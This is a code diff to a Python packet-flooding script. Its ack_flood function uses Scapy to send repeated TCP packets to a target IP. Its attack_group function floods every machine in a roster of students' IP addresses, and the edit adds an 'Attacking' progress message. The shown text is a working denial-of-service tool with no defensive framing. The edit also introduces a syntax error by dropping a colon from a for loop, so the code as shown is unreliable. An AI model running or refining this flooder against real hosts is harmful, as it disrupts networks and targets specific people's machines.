@@ -24,7 +24,7 @@ def ack_flood(dest_ip, dest_port, packet_count=1000):
         print("Scapy is required to send packets.")
         return
 
-    for _ in range(packet_count):
+    for i in range(packet_count):
         src_port = random.randint(1024, 65535)
         pkt = IP(dst=dest_ip) / TCP(
             sport=src_port,
@@ -33,7 +33,7 @@ def ack_flood(dest_ip, dest_port, packet_count=1000):
         )
         send(pkt, verbose=False)
         if (i + 1) % 100 == 0:
-            print("  Sent {} packets".format(i + 1))
+            print("Sent {} packets".format(i + 1))
         time.sleep(0.01)
 
 
@@ -43,7 +43,8 @@ def attack_group(group_name, roster, port, count):
         return
 
     group = roster[group_name]
-    for student, ip in group.items():
+    for student, ip in group.items()
+        print("Attacking {} -> {}".format(student, ip))
         ack_flood(ip, port, packet_count=count)
 
 
